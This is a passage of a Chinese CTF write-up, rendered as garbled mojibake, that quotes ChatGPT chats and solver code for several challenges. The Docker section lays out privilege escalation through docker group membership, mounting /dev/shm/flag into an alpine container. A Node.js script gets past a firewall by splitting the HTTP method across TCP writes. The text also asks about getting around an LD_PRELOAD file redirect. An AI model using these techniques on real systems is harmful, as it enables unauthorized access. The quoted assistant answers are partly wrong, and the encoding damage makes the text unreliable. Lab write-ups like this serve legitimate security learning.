> åœ¨ Linuxã€macOSã€WSL æˆ– Git Bash ç­‰æœ¬åœ°ç»ˆç«¯ä¸­ä½¿ç”¨ stty raw -echo; nc 202.38.93.111 10338; stty sane å‘½ä»¤æ¥è¿æ¥é¢˜ç›®ã€‚å¦‚æœé‡‡ç”¨è¿™ç§æ–¹æ³•ï¼Œä½ å¿…é¡»æ‰‹åŠ¨è¾“å…¥ tokenï¼ˆå¤åˆ¶ç²˜è´´ä¹Ÿå¯ï¼‰ã€‚æ³¨æ„ï¼Œè¾“å…¥çš„ token ä¸ä¼šè¢«æ˜¾ç¤ºï¼Œè¾“å…¥ç»“æŸåæŒ‰ Ctrl-J å³å¯å¼€å§‹é¢˜ç›®ã€‚
> æ— è®ºé‡‡ç”¨å“ªç§æ–¹æ³•è¿æ¥é¢˜ç›®ï¼Œå¯åŠ¨é¢˜ç›®å‡éœ€è¦æ•°ç§’æ—¶é—´ï¼Œå‡ºç°é»‘å±æ˜¯æ­£å¸¸ç°è±¡ï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚

> éå¸¸æŠ±æ­‰ï¼Œæˆ‘ä¹‹å‰çš„å›ç­”ç¡®å®è¯¯è§£äº†æ‚¨çš„é—®é¢˜ã€‚æ ¹æ®æ‚¨æä¾›çš„ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸€é“ CTF é¢˜ç›®ï¼Œæ‚¨éœ€è¦é€šè¿‡ Docker ç”¨æˆ·ç»„æ¥è·å– flag æ–‡ä»¶ã€‚
>
> æ‚¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤å°è¯•æ‰“å¼€ `/flag` æ–‡ä»¶ï¼š
> 
> 1. é¦–å…ˆï¼Œæ‚¨éœ€è¦è¿æ¥åˆ°é¢˜ç›®ç¯å¢ƒã€‚æ‚¨å¯ä»¥ç‚¹å‡»ã€Œæ‰“å¼€/ä¸‹è½½é¢˜ç›®ã€æŒ‰é’®é€šè¿‡ç½‘é¡µç»ˆç«¯ä¸è¿œç¨‹äº¤äº’ï¼Œæˆ–è€…åœ¨æœ¬åœ°ç»ˆç«¯ä¸­ä½¿ç”¨ `stty raw -echo; nc 202.38.93.111 10338; stty sane` å‘½ä»¤è¿æ¥é¢˜ç›®ã€‚
> 
> 2. è¿æ¥æˆåŠŸåï¼Œæ‚¨å°†ä»¥ä½æƒé™çš„ `hg` ç”¨æˆ·ç™»å½•ã€‚
> 
> 3. æ‚¨å¯ä»¥ä½¿ç”¨ `docker run` å‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ª Docker å®¹å™¨ï¼Œå¹¶å°† `/flag` æ–‡ä»¶æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªåä¸º `mycontainer` çš„å®¹å™¨ï¼Œå¹¶å°† `/flag` æŒ‚è½½åˆ°å®¹å™¨çš„ `/mnt` ç›®å½•ï¼š
>    ```
>    docker run -v /flag:/mnt --name mycontainer -it ubuntu:latest /bin/bash
>    ```
> 
> 4. è¿›å…¥å®¹å™¨åï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹ `/mnt` ç›®å½•ï¼Œåº”è¯¥å¯ä»¥çœ‹åˆ° `flag` æ–‡ä»¶çš„å†…å®¹ï¼š
>    ```
>    cd /mnt
>    cat flag
>    ```
> 
> è¯·æ³¨æ„ï¼Œæ­¤é¢˜ç›®ç¯å¢ƒä¼šåœ¨è¿è¡Œ 15 åˆ†é’Ÿåè‡ªåŠ¨å…³é—­ï¼Œå› æ­¤æ‚¨éœ€è¦å°½å¿«å®Œæˆæ“ä½œã€‚ç¥æ‚¨å¥½è¿ï¼

> é¢˜ç›®ç¯å¢ƒæ²¡æœ‰ç½‘ç»œï¼Œä¸èƒ½ä½¿ç”¨ ubuntuï¼Œå¦‚ä½•è·å–æœ¬åœ°é‡Œå¯ç”¨çš„ç‰ˆæœ¬

> å¦‚æœé¢˜ç›®ç¯å¢ƒæ²¡æœ‰ç½‘ç»œè¿æ¥ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨æœ¬åœ°å·²ç»ä¸‹è½½å¥½çš„ Docker é•œåƒã€‚ä»¥ä¸‹æ˜¯ä¸€ç§è·å–æœ¬åœ°å¯ç”¨ç‰ˆæœ¬çš„æ–¹æ³•ï¼š
> 
> 1. é¦–å…ˆï¼Œæ‚¨éœ€è¦åœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œ Dockerã€‚ç¡®ä¿æ‚¨å·²ç»å®‰è£…äº† Docker å¹¶ä¸”å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚
> 
> 2. æ‰“å¼€ç»ˆç«¯ï¼Œå¹¶è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹æœ¬åœ°å·²ä¸‹è½½çš„ Docker é•œåƒåˆ—è¡¨ï¼š
>    ```
>    docker images
>    ```
> 
>    è¿™å°†åˆ—å‡ºæ‚¨æœ¬åœ°æœºå™¨ä¸Šå·²ç»ä¸‹è½½çš„ Docker é•œåƒåŠå…¶ç›¸å…³ä¿¡æ¯ã€‚
> 
> 3. åœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°ä¸€ä¸ªæ‚¨è®¤ä¸ºå¯ä»¥ä½¿ç”¨çš„é•œåƒã€‚æ‚¨å¯ä»¥æ ¹æ®é•œåƒçš„åç§°å’Œæ ‡ç­¾æ¥é€‰æ‹©ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æœ‰ä¸€ä¸ªåä¸º `ubuntu` çš„é•œåƒï¼Œå¯ä»¥ä½¿ç”¨ `ubuntu:latest` æˆ– `ubuntu:<tag>` æ¥æŒ‡å®šç‰ˆæœ¬ã€‚
> 
> 4. ä½¿ç”¨æ‰€é€‰é•œåƒçš„åç§°å’Œæ ‡ç­¾ï¼Œæ›¿æ¢ä¹‹å‰æåˆ°çš„ `ubuntu:latest` éƒ¨åˆ†ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªæŒ‚è½½äº† `/flag` æ–‡ä»¶çš„å®¹å™¨ï¼š
>    ```
>    docker run -v /flag:/mnt --name mycontainer -it <image_name>:<tag> /bin/bash
>    ```
> 
>    è¯·ç¡®ä¿å°† `<image_name>` å’Œ `<tag>` æ›¿æ¢ä¸ºæ‚¨é€‰æ‹©çš„é•œåƒçš„å®é™…åç§°å’Œæ ‡ç­¾ã€‚
> 
> 5. è¿›å…¥å®¹å™¨åï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹ `/mnt` ç›®å½•ï¼Œåº”è¯¥å¯ä»¥çœ‹åˆ° `flag` æ–‡ä»¶çš„å†…å®¹ï¼š
>    ```
>    cd /mnt
>    cat flag
>    ```
> 
> é€šè¿‡ä½¿ç”¨æœ¬åœ°å·²ä¸‹è½½çš„ Docker é•œåƒï¼Œæ‚¨å¯ä»¥åœ¨æ²¡æœ‰ç½‘ç»œè¿æ¥çš„æƒ…å†µä¸‹è·å– flag æ–‡ä»¶ã€‚ç¥æ‚¨æˆåŠŸï¼

> ```
> REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
> alpine       latest    187eae39ad94   2 months ago   5.54MB
> ```

> éå¸¸æ„Ÿè°¢æ‚¨æä¾›çš„ä¿¡æ¯ã€‚æ ¹æ®æ‚¨çš„å›ç­”ï¼Œæ‚¨çš„æœ¬åœ°æœºå™¨ä¸Šæœ‰ä¸€ä¸ªåä¸º `alpine` çš„é•œåƒï¼Œæ ‡ç­¾ä¸º `latest`ã€‚
> 
> æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªæŒ‚è½½äº† `/flag` æ–‡ä»¶çš„å®¹å™¨ï¼š
> 
> ```
> docker run -v /flag:/mnt --name mycontainer -it alpine:latest /bin/sh
> ```
> 
> è¯·ç¡®ä¿æ‚¨å·²ç»åœ¨ç»ˆç«¯ä¸­åˆ‡æ¢åˆ°æ­£ç¡®çš„å·¥ä½œç›®å½•ï¼Œå¹¶ä½¿ç”¨ä¸Šè¿°å‘½ä»¤æ›¿æ¢ `<image_name>` å’Œ `<tag>` éƒ¨åˆ†ã€‚
> 
> è¿›å…¥å®¹å™¨åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ `/mnt` ç›®å½•å¹¶è·å– flag æ–‡ä»¶çš„å†…å®¹ï¼š
> 
> ```
> cd /mnt
> cat flag
> ```
> 
> ç¥æ‚¨æˆåŠŸè·å– flag æ–‡ä»¶ï¼å¦‚æœ‰ä»»ä½•é—®é¢˜ï¼Œè¯·éšæ—¶æé—®ã€‚

> `docker: Error response from daemon: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: error during container init: error mounting "/flag" to rootfs at "/.`

> å¾ˆæŠ±æ­‰ï¼Œæ‚¨é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ã€‚æ ¹æ®é”™è¯¯ä¿¡æ¯ï¼Œçœ‹èµ·æ¥åœ¨å°è¯•æŒ‚è½½ `/flag` æ–‡ä»¶åˆ°å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿæ—¶å‡ºç°äº†é—®é¢˜ã€‚
> 
> è¿™å¯èƒ½æ˜¯ç”±äºæƒé™æˆ–æ–‡ä»¶ç³»ç»Ÿçš„é™åˆ¶å¯¼è‡´çš„ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒDocker å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿæ˜¯åªè¯»çš„ï¼Œæ— æ³•è¿›è¡ŒæŒ‚è½½æ“ä½œã€‚
> 
> æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨å¦å¤–ä¸€ä¸ªç›®å½•è¿›è¡ŒæŒ‚è½½ï¼Œä¾‹å¦‚ `/mnt/flag`ã€‚è¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶æŒ‚è½½ `/mnt/flag` ç›®å½•ï¼š
> 
> ```
> docker run -v /mnt/flag:/mnt --name mycontainer -it alpine:latest /bin/sh
> ```
> 
> ç„¶åï¼Œæ‚¨å¯ä»¥åœ¨å®¹å™¨ä¸­ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ `/mnt` ç›®å½•å¹¶è·å– flag æ–‡ä»¶çš„å†…å®¹ï¼š
> 
> ```
> cd /mnt
> cat flag
> ```
> 
> å¦‚æœé—®é¢˜ä»ç„¶å­˜åœ¨ï¼Œè¯·ç¡®ä¿æ‚¨å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥è¿›è¡ŒæŒ‚è½½æ“ä½œï¼Œå¹¶ä¸”ç›®æ ‡ç›®å½•ä¸å­˜åœ¨äºå®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚
> 
> å¦‚æœé—®é¢˜ä»ç„¶æ— æ³•è§£å†³ï¼Œè¯·æä¾›æ›´å¤šçš„ç»†èŠ‚å’Œé”™è¯¯ä¿¡æ¯ï¼Œä»¥ä¾¿æˆ‘ä»¬èƒ½å¤Ÿæ›´å¥½åœ°å¸®åŠ©æ‚¨è§£å†³é—®é¢˜ã€‚

> ä¸å¯¹å§ï¼Œä»–è¯´ flag æ˜¯è½¯è¿æ¥ï¼Œå®é™…ä½ç½®åœ¨ /dev/shm/flag

> éå¸¸æŠ±æ­‰ä¹‹å‰çš„å›ç­”æœ‰è¯¯ã€‚æ ¹æ®æ‚¨æä¾›çš„ä¿¡æ¯ï¼Œflag æ–‡ä»¶å®é™…ä¸Šæ˜¯ä¸€ä¸ªè½¯é“¾æ¥ï¼Œä½äº `/dev/shm/flag`ã€‚
> 
> æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªæŒ‚è½½äº† `/dev/shm/flag` æ–‡ä»¶çš„å®¹å™¨ï¼š
> 
> ```
> docker run -v /dev/shm/flag:/mnt/flag --name mycontainer -it alpine:latest /bin/sh
> ```
> 
> è¿›å…¥å®¹å™¨åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ `/mnt/flag` ç›®å½•å¹¶è·å– flag æ–‡ä»¶çš„å†…å®¹ï¼š
> 
> ```
> cd /mnt/flag
> cat flag
> ```
> 
> è¯·ç¡®ä¿æ‚¨å·²ç»åœ¨ç»ˆç«¯ä¸­åˆ‡æ¢åˆ°æ­£ç¡®çš„å·¥ä½œç›®å½•ï¼Œå¹¶ä½¿ç”¨ä¸Šè¿°å‘½ä»¤æ›¿æ¢ `<image_name>` å’Œ `<tag>` éƒ¨åˆ†ã€‚
> 
> ç¥æ‚¨æˆåŠŸè·å– flag æ–‡ä»¶ï¼å¦‚æœ‰ä»»ä½•é—®é¢˜ï¼Œè¯·éšæ—¶æé—®ã€‚

> æƒœå­—å¦‚é‡‘ 2.0

è¿™é¢˜ä¸åŒäººçš„è„šæœ¬å¯èƒ½ä¸ä¸€æ ·ï¼Œæˆ‘è¿™é‡Œä»¥è‡ªå·±çš„ä¸ºä¾‹ã€‚

å…ˆä¿®ä¸€äº› `__nam__` è¿™ç§æ˜¾ç„¶çš„é”™è¯¯

è§‚å¯Ÿä¸€ä¸‹ä»£ç ï¼š

```python
cod_dict = []
cod_dict += ['nymeh1niwemflcir}echaet']
cod_dict += ['a3g7}kidgojernoetlsup?h']
cod_dict += ['ulw!f5soadrhwnrsnstnoeq']
cod_dict += ['ct{l-findiehaai{oveatas']
cod_dict += ['ty9kxborszstguyd?!blm-p']

check_equals(set(len(s) for s in cod_dict), {24})
```

å‘ç°æ¯ä¸€æ®µçš„é•¿åº¦éƒ½æ˜¯ 24ï¼Œè€Œæƒœå­—å¦‚é‡‘åŒ–ä¹‹åæ˜¯ 23ã€‚

```python
flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
                        17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
                        31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
                        25, 63, 77, 36, 5, 32, 60, 67, 113, 28])
```
è¿™ä¸ªå®é™…ä¸Šæ˜¯è·å–äº†æ¯ä¸ªæ•°åœ¨ `code_dict` å¯¹åº”çš„å­—ç¬¦ï¼Œç„¶åæ‹¼ä¸€èµ·è·å¾— flagã€‚

å·²çŸ¥ flag ä»¥ `flag{` å¼€å¤´ï¼Œä»¥ `}` ç»“å°¾ã€‚

æ ¹æ® f å¯ä»¥æ¨æ–­å‡ºç¬¬ä¸‰è¡Œï¼Œ`ulw!` éƒ¨åˆ†è¢«åˆ é™¤äº†ä¸€ä¸ªå­—ç¬¦ã€‚

æ ¹æ® l å¯ä»¥æ¨æ–­å‡ºç¬¬äºŒè¡Œï¼Œ`sup?h` éƒ¨åˆ†è¢«åˆ é™¤äº†ä¸€ä¸ªå­—ç¬¦ã€‚

a ç»™å‡ºçš„çº¦æŸå¼±äº {ã€‚

æ ¹æ® g å¯ä»¥æ¨æ–­å‡ºç¬¬äº”è¡Œ `ty9kxborszst` éƒ¨åˆ†è¢«åˆ é™¤äº†ä¸€ä¸ªå­—ç¬¦ã€‚

æ ¹æ® { å¯ä»¥æ¨æ–­å‡ºç¬¬äº”è¡Œ `ct` éƒ¨åˆ†åˆ é™¤äº†ä¸€ä¸ªå­—ç¬¦ã€‚

ç„¶åå·®ä¸å¤šèƒ½åšäº†ï¼Œç›´æ¥æšä¸¾ã€‚

```javascript
const choice1 = [
    'echaete',
    'echaett',
    'echhaet',
    'ecchaet',
]

const choice2 = [
    'sup?hh',
    'supe?h',
    'supp?h',
    'ssup?h',
]

const choice3 = [
    'ulwe!',
    'ulww!',
    'ullw!',
]

const choice4 = [
    'cte',
    'ctt',
    'cct',
]

const choice5 = [
    'ty9kxborszstt',
    'ty9kxborszsst',
    'ty9kxborszzst',
    'ty9kxborsszst',
    'ty9kxborrszst',
    'ty9kxbborszst',
    'ty9kxxborszst',
    'ty9kkxborszst',
    'tye9kxborszst',
    'tyy9kxborszst',
    'tty9kxborszst',
]

// const dict = []
// dict.push(choice1.reduce((arr, cur) => `nymeh1niwemflcir}${cur}`, []))

const data = [
    53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
    17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
    31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
    25, 63, 77, 36, 5, 32, 60, 67, 113, 28
]

const flags = []

for (let i1 = 0; i1 < choice1.length; i1++) {
    for (let i2 = 0; i2 < choice2.length; i2++) {
        for (let i3 = 0; i3 < choice3.length; i3++) {
            for (let i4 = 0; i4 < choice4.length; i4++) {
                for (let i5 = 0; i5 < choice5.length; i5++) {
                    const dict = `nymeh1niwemflcir}${choice1[i1]}a3g7}kidgojernoetl${choice2[i2]}${choice3[i3]}f5soadrhwnrsnstnoeq${choice4[i4]}{l-findiehaai{oveatas${choice5[i5]}guyd?!blm-p`
                    const flag = data.reduce((s, n) => s + dict[n], "")
                    flags.push(flag);
                }
            }
        }
    }
}

console.log(Array.from(new Set(flags)))
```

ç­”æ¡ˆæ˜¯å”¯ä¸€çš„ã€‚
## ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ

å‘ç°å½•åˆ¶å·¥å…·æ˜¯ asciinemaï¼Œå¼€ä¸€å° linux è¿è¡Œ `asciinema cat asciinema_restore.rec > flag.js`ï¼Œç„¶åæ›¿æ¢ä¸€ä¸‹ ANSI

```python
import re

ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

with open('flag.js', 'r') as f:
    content = f.read()

content_without_ansi = ansi_escape.sub('', content)

with open('flag.js', 'w') as f:
    f.write(content_without_ansi)
```

ä»¥ä¸Šä»£ç ç”± ChatGPT ç”Ÿæˆ

ç„¶åå›åˆ°æˆ‘çš„ windowsï¼Œç”¨ vscode æ‰“å¼€ flag.js åˆ ä¸€ä¸‹æ²¡åˆ å¹²å‡€çš„ä¸œè¥¿ï¼Œæ¯”å¦‚çªç„¶å‡ºç°çš„ç¥ç§˜æ¢è¡Œï¼Œåªè¦æŠŠ `\n(\S)` æ›¿æ¢æˆ `$1` å°±å¥½äº†ã€‚

è¿è¡Œï¼Œå¾—åˆ° flagã€‚
## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ
### You Are Smart

å¯¹ä¸èµ·æˆ‘å¿˜è®°äº†ğŸ˜­
### Accepted

å‘ç°é¢˜ç›®é‡Œæœ‰ç¥ç§˜é“¾æ¥ï¼š[TinyStories-33M.zip](https://hack.lug.ustc.edu.cn/media/21fb5dd1-efac-5554-a7d2-b2a8d8d5c75f/TinyStories-33M.zip)ï¼Œä¸‹è½½ä¸‹æ¥ä¹‹åæ‰¾åˆ°ä¸€ç¯‡è®ºæ–‡å’Œ datasetï¼ŒæŠŠè®­ç»ƒæ•°æ®ä¸‹è½½ä¸‹æ¥ï¼Œç¿»ä¸€ç¿»ï¼Œéƒ½å¥½å¤§ï¼Œæˆ‘çš„ vscode ç›´æ¥å¡æ­»äº†ã€‚

æˆ‘ç”¨ idea æ‰“å¼€äº†æœ€å°çš„é‚£ä¸ªï¼Œç„¶åæœç´¢ "accepted"ï¼Œä¸æ–­æŠŠ accepted ä¹‹å‰çš„é‚£ä¸ªè¯å–‚ç»™ AI å°±å¥½äº†ã€‚

ç­”æ¡ˆï¼š`Apology`ã€‚ï¼ˆæˆ‘ä¹‹å‰å–‚è¿‡ `apology` å±…ç„¶ä¸å¯¹ï¼‰
## ğŸª æµå¼æ˜Ÿçƒ

> é—®ä¸€ä¸‹ ChatGPTã€‚
> 
> è¿™æ˜¯ä¸€æ®µ python ä»£ç ï¼Œå®ƒè¯»å– video.mp4 å¹¶ä¸”è¾“å‡ºåˆ° video.binï¼š
> ```python
> import cv2
> import numpy as np
> import random
> 
> def create_video(file, output):
>     vidcap = cv2.VideoCapture(file)
>     frame_count = int(vidcap.get(cv2.CAP_PROP_FRAME_COUNT))
>     frame_width = int(vidcap.get(cv2.CAP_PROP_FRAME_WIDTH))
>     frame_height = int(vidcap.get(cv2.CAP_PROP_FRAME_HEIGHT))
> 
>     assert frame_width % 10 != 0
>     assert frame_height % 10 != 0
> 
>     buffer = np.empty(shape=(frame_count, frame_height, frame_width, 3), dtype=np.uint8)
> 
>     for i in range(frame_count):
>         success, frame = vidcap.read()
>         if not success:
>             raise Exception(f"Failed to read frame {i}")
>         buffer[i] = frame
> 
>     buffer = buffer.reshape((frame_count * frame_height * frame_width, 3))
>     buffer = buffer.ravel()
>     buffer = buffer[:-random.randint(0, 100)]
>     buffer.tofile(output)
> 
> 
> if __name__ == "__main__":
>     with open("video.bin", "wb") as output:
>         create_video("video.mp4", output)
> ```
> ç°åœ¨ï¼Œè¯·ä½ æ ¹æ®è¿™æ®µä»£ç ï¼Œç¼–å†™ä¸€ä¸ªä» video.bin è¿˜åŸå› video.mp4 çš„ä»£ç ã€‚

> ä»¥ä¸‹æ˜¯æ ¹æ®ç»™å®šçš„ä»£ç ç¼–å†™çš„ä» video.bin è¿˜åŸå› video.mp4 çš„ä»£ç ï¼š
> 
> ```
> import cv2
> import numpy as np
> 
> def restore_video(file, output):
>     with open(file, "rb") as input_file:
>         buffer = np.frombuffer(input_file.read(), dtype=np.uint8)
> 
>     frame_count = buffer.size // (frame_height * frame_width * 3)
>     buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))
> 
>     writer = cv2.VideoWriter(output, cv2.VideoWriter_fourcc(*"mp4v"), 30, (frame_width, frame_height))
> 
>     for i in range(frame_count):
>         writer.write(buffer[i])
> 
>     writer.release()
> 
> 
> if __name__ == "__main__":
>     restore_video("video.bin", "restored_video.mp4")
> ```
> 
> è¯·æ³¨æ„ï¼Œè¿˜åŸè§†é¢‘çš„ä»£ç éœ€è¦çŸ¥é“åŸå§‹è§†é¢‘çš„å¸§å®½åº¦å’Œå¸§é«˜åº¦ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å‡è®¾åœ¨è¿˜åŸè§†é¢‘æ—¶å·²ç»çŸ¥é“äº†è¿™äº›ä¿¡æ¯ã€‚å¦‚æœä¸çŸ¥é“åŸå§‹è§†é¢‘çš„å¸§å®½åº¦å’Œå¸§é«˜åº¦ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚

ç¡®å®éœ€è¦ä¿®æ”¹ä¸‹ï¼Œè¿™é“é¢˜éšæœºåˆ‡æ‰äº†å‡ ä½ã€‚

æˆ‘ä¿®æ”¹åçš„ä»£ç ï¼š

```python
import cv2
import numpy as np

frame_width = 61 * 7
frame_height = 11 * 23
padding_length = 135146781 - 135146688

def restore_video(file, output):
    with open(file, "rb") as input_file:
        buffer = np.frombuffer(input_file.read(), dtype=np.uint8)

    padding = np.zeros(padding_length, dtype=np.uint8)
    buffer = np.concatenate((buffer, padding))

    frame_count = buffer.size // (frame_height * frame_width * 3)
    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))

    writer = cv2.VideoWriter(output, cv2.VideoWriter_fourcc(*"mp4v"), 30, (frame_width, frame_height))

    for i in range(frame_count):
        writer.write(buffer[i])

    writer.release()


if __name__ == "__main__":
    restore_video("video.bin", "restored_video.mp4")
```

`135146688` æ˜¯åŸæœ¬çš„ buffer é•¿åº¦ï¼Œæˆ‘æšä¸¾è¿™ä¹‹åä¸€ç™¾ä¸ªä¸‰çš„å€æ•°ï¼Œæ›´æ–° `padding_length`ï¼Œè¿›è¡Œè´¨å› æ•°åˆ†è§£ï¼Œæ’åˆ—ç»„åˆç»™ `frame_width` å’Œ `frame_height`ï¼Œç„¶åæ‰§è¡Œä»£ç ï¼ŒæŸ¥çœ‹è§†é¢‘ã€‚

æœ€åè¢«æˆ‘è¯•å‡ºæ¥äº†ã€‚ã€‚
## ğŸª ä½å¸¦å®½æ˜Ÿçƒ
### å°è¯•ç‰›åˆ€

å‹ç¼©ç¨‹åºï¼š
```python
from PIL import Image

def convert_to_indexed(image_path):
    # æ‰“å¼€å›¾åƒ
    image = Image.open(image_path)

    # è½¬æ¢ä¸ºç´¢å¼•è‰²å½©æ¨¡å¼
    image = image.convert("P", palette=Image.ADAPTIVE, colors=256)

    # ä¿å­˜è½¬æ¢åçš„å›¾åƒ
    output_path = image_path.replace(".png", "_indexed.png")
    image.save(output_path)
    print("è½¬æ¢å®Œæˆï¼ä¿å­˜ä¸º", output_path)
## è°ƒç”¨ç¤ºä¾‹
image_path = "output.png"  # æ›¿æ¢ä¸ºä½ çš„å›¾åƒè·¯å¾„
convert_to_indexed(image_path)
```

æˆ‘ä¸ä¼š Pythonï¼Œè¿™æ®µä»£ç ä¹Ÿæ˜¯ ChatGPT å†™çš„ï¼Œä½†æ˜¯èŠå¤©è®°å½•æˆ‘æ‰¾ä¸åˆ°äº†ã€‚
## Komm, sÃ¼sser Flagge
### æˆ‘çš„ POSTï¼Œæˆ‘çš„ P

å¤šæ¬¡è¯¢é—® ChatGPT æ— æœã€‚

å°è¯•è¿‡æŠŠ POST æ”¹æˆå°å†™ï¼Œå‘ç°ä¸è®¤ã€‚

å°è¯•ç”¨äºŒè¿›åˆ¶å‘é€ï¼Œå‘ç°æœ¬æ¥å°±æ˜¯äºŒè¿›åˆ¶å‘é€ã€‚

æœ€åç™¾åº¦ CTF é˜²ç«å¢™å¸¸è§ç»•è¿‡æ–¹å¼ï¼Œæ‰¾åˆ° https://zhuanlan.zhihu.com/p/165159020

å‘ç°å¯ä»¥æ‹†æµé‡åŒ…ã€‚

```javascript
const net = require('net')

const token = `ä½ çš„å·å•ƒ`

const req = 
`OST / HTTP/1.1\r\n` +
`Host: 202.38.93.111:18081\r\n` +
`Content-Type: application/x-www-form-urlencoded` +
`Accept: */*\r\n` +
`Content-Length: ${encodeURI(token).length}\r\n\r\n` +
encodeURI(token) + '\r\n\r\n'

const socket = net.createConnection(18080, '202.38.93.111')

socket.on('data', async data => {
    console.log(data.toString())
})

socket.on('connect', () => {
    socket.write('P')
    socket.write(req)
})
```

å“ˆå“ˆï¼Œä¸€ä¸‹é€šè¿‡ä¸¤é—®ï¼Œç™½æ¡ 400 åˆ†ï¼Œé«˜å…´äº†ã€‚
## ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡

> å…¶å®æˆ‘ä¹Ÿä¸ä¼šè¿™é¢˜ï¼Œé—®é—® ChatGPTï¼š
> 
> æœ‰ä¸€é“ CTF é¢˜ç›®ï¼Œä½ éœ€è¦æäº¤ä¸€ä¸ª linux ä¸‹çš„ ELF å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶ä¼šä¸å¦ä¸€ä¸ª LD_PRELOAD åçš„ lib1.so ä¸€èµ·åŠ è½½ï¼Œlib1 ä¼šé‡å®šå‘æ‰€æœ‰æ‰“å¼€ /flag çš„è¯·æ±‚ä»¥æŸç§æ–¹å¼> å˜æˆæ‰“å¼€ /fakeflag çš„è¯·æ±‚ï¼Œä½ éœ€è¦åœ¨è¿™ç§æƒ…å†µä¸‹ç»•è¿‡è¿™ä¸ªé‡å®šå‘æ¥æ‰“å¼€ /flagï¼Œä»¥ä¸‹æ˜¯ lib1 çš„æºä»£ç ï¼š
> ```
> å¤ªé•¿äº†çœç•¥
> ```
> 
> ä»¥ä¸‹æ˜¯æµ‹è¯•ç”¨çš„ server.py çš„æºä»£ç ï¼š
> ```
> ä¸é•¿ä¹Ÿçœç•¥
> ```
> è¯·æ³¨æ„ï¼šä½ åªèƒ½ä¿®æ”¹ your_executable çš„å†…å®¹ï¼Œä¸èƒ½ä¿®æ”¹ lib1.so æˆ–è€… server.pyã€‚

> è¿™ä¸ªé—®é¢˜éœ€è¦ç»•è¿‡ LD_PRELOAD åŠ è½½çš„ lib1.so å¯¹æ‰“å¼€ /flag çš„è¯·æ±‚è¿›è¡Œé‡å®šå‘çš„é™åˆ¶ï¼Œæ¥æ‰“å¼€çœŸæ­£çš„ /flag æ–‡ä»¶ã€‚ä½ éœ€è¦åœ¨ä½ çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚
> 
> æœ‰å‡ ç§æ–¹æ³•å¯ä»¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼š
> 
> 1. ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼šåœ¨ä½ çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œç›´æ¥ä½¿ç”¨ç»å¯¹è·¯å¾„æ¥æ‰“å¼€ /flag æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¾èµ– LD_PRELOAD åŠ è½½çš„ lib1.soã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ `fopen("/flag", "r")` æ¥æ‰“å¼€ /> flag æ–‡ä»¶ã€‚
> 
